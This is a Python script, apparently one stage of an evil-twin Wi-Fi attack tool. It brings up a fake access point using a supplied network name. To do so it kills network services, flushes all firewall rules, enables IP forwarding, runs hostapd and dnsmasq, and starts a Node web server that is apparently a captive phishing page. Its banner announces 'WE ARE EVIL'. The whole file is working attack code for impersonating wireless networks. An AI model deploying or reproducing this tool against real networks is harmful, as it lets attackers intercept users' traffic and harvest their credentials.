import os
import sys
import threading
import time



 
### Console colors
W  = '\033[0m'  # white 
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan


### Reset all the setting before we satrt. 
def reset_setting():
	### Start system network service.
	os.system('service NetworkManager start')
	### Stop and kill the hostapd and dnsmasq services.
	os.system('service hostapd stop')
	os.system('service dnsmasq stop')
	os.system('service rpcbind stop')
	os.system('killall dnsmasq')
	os.system('killall hostapd')
	### Enable and start all the process that uses port 53.
	os.system('systemctl enable systemd-resolved.service') 
	os.system('systemctl start systemd-resolved')  


##############################################
############### Start fake AP ################
##############################################
	
### Setup the fake access point settings.
def fake_ap_on():
	### Disable and stop all the process that uses port 53.
	os.system('systemctl disable systemd-resolved.service')
	os.system('systemctl stop systemd-resolved')
	### Stop system network service 
	os.system('service NetworkManager stop')
	### Define the fake AP ip address, and the subnet mask.
	ifconfig="ifconfig "+ interface2 +" 10.0.0.1 netmask 255.255.255.0"
	# os.system('airmon-ng check kill')
	### Replace airmon-ng.
	os.system(' pkill -9 hostapd')
	os.system(' pkill -9 dnsmasq')
	os.system(' pkill -9 wpa_supplicant')
	os.system(' pkill -9 avahi-daemon')
	os.system(' pkill -9 dhclient')
	os.system('killall dnsmasq')
	os.system('killall hostapd')
	os.system(ifconfig)
	### Define the default gateway.
	os.system('route add default gw 10.0.0.1')
	### Enable IP forwarding (1 indicates to enable / 0 indicates to disable)
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	### Flush all chains - delete all of the firewall rules in all tables.
	# Chain is the set of rules that filter the incoming and outgoing data packets.
	os.system('iptables --flush')
	os.system('iptables --table nat --flush')
	os.system('iptables --delete-chain')
	os.system('iptables --table nat --delete-chain')
	### Allowing packets that forwarded to somewhere else to pass through. 
	os.system('iptables -P FORWARD ACCEPT')


### Link dnsmasq and hostapd to the configuration files. And Run the apache server.
def run_fake_ap():
	### Link the dnsmasq to the configuration file.
	os.system('dnsmasq -C dnsmasq.conf')
	### Start apache2 - web server
	# os.system('service apache2 start')
	### Start the web server
	os.system('gnome-terminal -- sh -c "node html/index2.js"')
	os.system('route add default gw 10.0.0.1')
	### Link the hostapd to the configuration file.
	os.system('hostapd hostapd.conf -B')
	# os.system('service apache2 start')
	os.system('route add default gw 10.0.0.1')


### Set the default gateway
def set_gateway():
	time.sleep(3)
	os.system('gnome-terminal -- sh -c "route add default gw 10.0.0.1"')
	#os.system('route add default gw 10.0.0.1')





##############################################
############ Configuration files #############
##############################################

### Create the hostapd and dnsmasq configuration files.	
def create_conf_files():
	line="python3 create_conf_files.py "+ interface2 + " " + essid
	os.system(line)


### Delete the hostapd and dnsmasq configuration files (they were temp files).
def remove_conf_files():
	try:
	    os.remove("dnsmasq.conf")
	except OSError:
	    pass
	try:
	    os.remove("hostapd.conf")
	except OSError:
	    pass


######################

if __name__ == "__main__":
	print(B + "********************************************************************** \n")
	print("******** Part 2: Set up & upload fake AP. MOHAHA. WE ARE EVIL ******** \n")
	print("********************************************************************** \n")
	print(G + "*** Step 1:  Choosing an interface that will be used for the fake AP. ***\n")
	empty = input ("Press Enter to continue.........")
	print(W)
	os.system('ifconfig')
	global interface2
	interface2 = input(G + "Please enter the interface name you want to use: ")
	
	reset_setting() 
	# ssid=input("Please enter the SSID name ")
	global essid
	essid = sys.argv[1] 
	
	print(G + "*** Step 2:  Activation of the fake AP. ***\n")
	empty = input ("Press Enter to continue.........")
	fake_ap_on()
	create_conf_files()
	t1 = threading.Thread(target=run_fake_ap())
	t2 = threading.Thread(set_gateway())
	t1.start()
	t2.start()
	t1.join()
	t2.join()
	
	print(G + "*** Step 3:  Deactivation of the fake AP. ***\n")
	empty = input ("Press Enter to Power OFF the fake AP.........")
	remove_conf_files()
	reset_setting()

	
	
